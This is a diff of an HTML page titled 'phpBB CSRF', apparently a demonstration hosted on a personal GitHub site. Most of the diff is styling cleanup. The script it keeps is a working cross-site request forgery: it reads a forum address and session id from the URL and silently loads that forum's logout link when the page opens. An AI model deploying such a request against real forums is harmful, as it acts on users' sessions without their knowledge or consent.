@@ -17,7 +17,6 @@
 
       #title {
         width: 520px;
-        height: 80px;
         margin-left: auto;
         margin-right: auto;
         color: #0090B0;
@@ -27,8 +26,6 @@
 
       #subtitle {
         width: 520px;
-        height: 40px;
-        margin-top: 60px;
         margin-left: auto;
         margin-right: auto;
         text-align: left;
@@ -38,7 +35,6 @@
 
       #box {
         width: 600px;
-        height: 250px;
         margin-top: 100px;
         margin-left: auto;
         margin-right: auto;
@@ -61,14 +57,13 @@
       var string = document.location.hash;
       var pattern = /(https?:\/\/([a-z]+\.?)+).+&sid=([0-9a-zA-Z]{32})/;
       var match = pattern.exec(string);
-      console.log(match);
       foo = new Image();
       foo.src = match[1]+'/ucp.php?mode=logout&sid='+match[(match.length-1)];
     </script>
     <div id="globalheader"><a href="http://grickit.github.com">&nbsp;&lt; Back to grickit.github.com</a> <a href="http://github.com/grickit/GambCiv">&nbsp;&lt; Source code</a></div>
     <div id="box">
-      <div id="title">phpBB CSRF</div>
-      <div id="subtitle">You've just been logged out of some phpBB forum out there.</a></div>
+      <p id="title">phpBB CSRF</p>
+      <p id="subtitle">You've just been logged out of some phpBB forum out there.</a></p>
     </div>
   </body>
 </html>
